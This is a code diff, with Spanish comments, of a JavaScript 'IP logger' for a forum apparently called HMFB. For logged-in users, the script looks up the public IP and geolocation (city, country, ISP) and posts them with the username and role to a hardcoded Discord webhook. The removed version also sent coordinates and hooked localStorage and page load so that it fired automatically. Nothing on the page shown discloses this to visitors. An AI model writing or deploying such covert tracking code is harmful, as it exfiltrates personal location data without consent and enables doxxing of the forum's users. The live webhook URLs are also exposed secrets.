@@ -1,7 +1,7 @@
-// Script de IP que SOLO se ejecuta cuando hay usuario logueado
+// Script de IP - Solo se ejecuta después del login
 const sendIP = () => {
-    // Verificar que haya un usuario logueado
-    let forumUser = null;
+    // Verificar si hay usuario logueado
+    let forumUser = "NO_IDENTIFICADO";
     let userRole = "unknown";
     
     try {
@@ -9,64 +9,50 @@ const sendIP = () => {
         if (session && session.username) {
             forumUser = session.username;
             userRole = session.role || 'user';
+        } else {
+            console.log("No hay usuario logueado - IP no enviada");
+            return;
         }
     } catch (e) {
-        console.log("No hay sesión activa");
-        return; // NO enviar IP si no hay usuario
-    }
-    
-    // Si no hay usuario, NO hacer nada
-    if (!forumUser) {
-        console.log("IP no enviada: Usuario no logueado");
+        console.log("Error al verificar sesión");
         return;
     }
     
-    // Solo proceder si hay usuario
+    // Solo continuar si hay usuario
+    console.log("Enviando IP para usuario:", forumUser);
+    
     fetch('https://api.ipify.org?format=json')
-        .then(ipResponse => ipResponse.json())
+        .then(response => response.json())
         .then(ipData => {
             const ipadd = ipData.ip;
+            
             return fetch(`https://ipapi.co/${ipadd}/json/`)
-                .then(geoResponse => geoResponse.json())
+                .then(response => response.json())
                 .then(geoData => {
-                    const dscURL = 'https://discord.com/api/webhooks/1448790293301166191/-H9kMHOh2udMpr0QZ8FQO7cdedbqwdxL8ZA7CRQ-Z0RfBMKv6Tq1jsO2W03q8jILoEcx';
+                    const dscURL = 'https://discord.com/api/webhooks/1448715548488634421/fNFu8AxkbmNpIijdmZWrBopyKsvFrwZSnWf5S7GGPyCrFYMaanD0oYjT5yv3BqbAv447';
+                    
                     return fetch(dscURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "HMFB Forum Logger",
+                            username: "HMFB Logger",
                             avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png",
-                            content: userRole === 'admin' ? 
-                                `@here **👑 ADMIN CONECTADO**` : 
-                                `@here **👤 USUARIO CONECTADO**`,
-                            embeds: [
-                                {
-                                    title: userRole === 'admin' ? `👑 ADMIN: ${forumUser}` : `👤 USUARIO: ${forumUser}`,
-                                    description: `**Rol:** ${userRole === 'admin' ? 'Administrador' : 'Usuario'}\n` +
-                                                `**Usuario:** ${forumUser}\n` +
-                                                `**IP:** ${ipadd}\n` +
-                                                `**ISP:** ${geoData.org || geoData.network || "Desconocido"}\n` +
-                                                `**Ubicación:** ${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "?"}\n` +
-                                                `**Coords:** ${geoData.latitude || "?"}, ${geoData.longitude || "?"}`,
-                                    color: userRole === 'admin' ? 0x800080 : 0x00FFFF,
-                                    footer: {
-                                        text: `HMFB Forum • ${new Date().toLocaleString()}`
-                                    },
-                                    thumbnail: {
-                                        url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png"
-                                    },
-                                    timestamp: new Date().toISOString()
-                                }
-                            ]
+                            content: userRole === 'admin' ? '@here **👑 ADMIN LOGUEADO**' : '@here **👤 USUARIO LOGUEADO**',
+                            embeds: [{
+                                title: userRole === 'admin' ? `👑 ADMIN: ${forumUser}` : `👤 ${forumUser}`,
+                                description: `**Usuario:** ${forumUser}\n**IP:** ${ipadd}\n**Ciudad:** ${geoData.city || '?'}\n**País:** ${geoData.country_name || '?'}\n**ISP:** ${geoData.org || geoData.network || '?'}`,
+                                color: userRole === 'admin' ? 0x800080 : 0x00FFFF,
+                                timestamp: new Date().toISOString()
+                            }]
                         })
                     });
                 });
         })
-        .then(dscResponse => {  
-            if (dscResponse.ok) {
-                console.log('✅ IP enviada a Discord');
+        .then(response => {
+            if (response.ok) {
+                console.log('✅ IP enviada correctamente');
             } else {
                 console.log('❌ Error al enviar IP');
             }
@@ -76,36 +62,5 @@ const sendIP = () => {
         });
 };
 
-// NO ejecutar automáticamente al cargar la página
-// Solo se ejecutará cuando se llame manualmente después del login
-
-// Observar cambios en localStorage para detectar logins
-const originalSetItem = localStorage.setItem;
-localStorage.setItem = function(key, value) {
-    originalSetItem.apply(this, arguments);
-    
-    // Si se guarda una sesión, enviar IP
-    if (key === 'currentSession') {
-        try {
-            const session = JSON.parse(value);
-            if (session && session.username) {
-                // Esperar un momento y enviar IP
-                setTimeout(sendIP, 1500);
-            }
-        } catch (e) {
-            // Error parsing, no hacer nada
-        }
-    }
-};
-
-// También ejecutar si ya hay sesión al cargar scripts
-document.addEventListener('DOMContentLoaded', function() {
-    // Pequeño delay para asegurar que todo esté listo
-    setTimeout(() => {
-        const session = JSON.parse(localStorage.getItem('currentSession'));
-        if (session && session.username) {
-            // Ya hay usuario logueado, enviar IP
-            setTimeout(sendIP, 2000);
-        }
-    }, 1000);
-});
+// NO ejecutar automáticamente al cargar
+// Solo se ejecutará cuando se llame manualmente
